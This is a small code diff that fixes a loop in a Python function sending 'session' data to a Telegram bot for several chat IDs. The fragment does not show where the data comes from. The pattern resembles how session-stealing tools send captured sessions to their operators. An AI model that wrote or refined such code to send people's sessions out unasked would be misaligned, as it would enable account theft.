@@ -34,9 +34,10 @@ def send_session_to_telegram(session_data: dict):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     for chat_id in CHAT_ID:
         requests.post(url, json={
-            "chat_id": CHAT_ID,
+            "chat_id": chat_id,
             "text": text
         })
+
 
 
 
